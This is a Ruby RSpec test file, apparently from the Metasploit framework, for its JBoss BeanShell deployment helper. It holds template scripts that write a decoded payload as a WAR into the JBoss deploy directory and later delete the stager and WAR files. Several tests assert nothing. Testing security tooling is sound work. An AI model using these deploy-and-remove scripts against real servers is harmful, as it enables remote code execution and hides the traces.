#-*- coding:binary -*-
require 'spec_helper'

require 'msf/core'
require 'msf/http/jboss'

describe Msf::HTTP::JBoss do
  subject do
    mod = ::Msf::Module.new
    mod.extend described_class
    mod
  end

  let (:app_base) do
    "blah"
  end

  let (:stager_base) do
    "stager_base"
  end

  let (:stager_jsp_name) do
    "stager"
  end

  let (:encoded_payload) do
    "YmxhaCAtbgo="
  end

  describe '#target_uri' do
    it 'returns an URI' do
      expect(subject.target_uri).to be_kind_of URI
    end
  end

  describe '#depoy_bsh' do
    it 'return true when bsh script get deployed' do
      allow(subject).to receive(:invoke_bshscript) do
        res = Rex::Proto::Http::Response::OK.new
      end
      expect(subject.deploy_bsh(:gen_payload_bsh)).to eq true
      expect(subject.deploy_bsh(:gen_stager_bsh)).to eq true
      expect(subject.deploy_bsh(:gen_undeploy_bsh)).to eq true
      expect(subject.deploy_bsh(:gen_undeploy_stager)).to eq true
    end

    it 'return false when authentication is required' do
      allow(subject).to receive(:invoke_bshscript) do
        res = Rex::Proto::Http::Response.new(401, "Authentication required")
      end
      expect(subject.deploy_bsh(:gen_payload_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_stager_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_stager)).to eq false
    end

    it 'return false when invalid http response' do
      allow(subject).to receive(:invoke_bshscript) do
        res = Rex::Proto::Http::Response::E404.new
      end
      expect(subject.deploy_bsh(:gen_payload_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_stager_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_stager)).to eq false
    end

    it 'return false when unabled to reach BSHDeployer' do
      allow(subject).to receive(:invoke_bshscript) do
        res = nil
      end
      expect(subject.deploy_bsh(:gen_payload_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_stager_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_bsh)).to eq false
      expect(subject.deploy_bsh(:gen_undeploy_stager)).to eq false
    end
  end

  describe '#invoke_bshscript' do
    it 'return nil when unable to reach BSHDeployer' do
      allow(subject).to receive(:send_request_cgi) do
        res = nil 
      end
        
    end
    
    it 'failed when authentication required' do 
      allow(subject).to receive(:send_request_cgi) do
        res = Rex::Proto::Http::Response.new(401, "Authentication required")
      end
    end

    it 'failed when invalid http response ' do
      allow(subject).to receive(:send_request_cgi) do
        res = Rex::Proto::Http::Response::E404.new
      end
    end 

    it 'succeed when valid http response ' do
      allow(subject).to receive(:send_request_cgi) do
        res = Rex::Proto::Http::Response::OK.new
      end
    end 
  end

  describe '#gen_payload_bsh' do
    it 'return a bsh payload' do
      payload_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "#{encoded_payload}";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
byte[] byteval = decoder.decodeBuffer(val);
String war_file = jboss_home + "/deploy/#{app_base + '.war'}";
FileOutputStream fstream = new FileOutputStream(war_file);
fstream.write(byteval);
fstream.close();
EOT
    end
  end

  describe '#gen_stager_bsh' do
    it 'return a bsh payload' do
      stager_bsh_script = "BSH script"
    end
  end

  describe '#gen_undeploy_stager' do
    it 'return a bsh script which undeploy stager and WAR' do
      delete_stager_script = <<-EOT
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/#{stager_base + '.war/' + stager_jsp_name + '.jsp'}").delete();
new File(jboss_home + "/deploy/#{stager_base + '.war'}").delete();
new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
EOT
    end
  end

  describe '#gen_undeploy_bsh' do
    it 'return a bsh script which undeploy WAR' do
      delete_script = <<-EOT
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
EOT
    end
  end
end
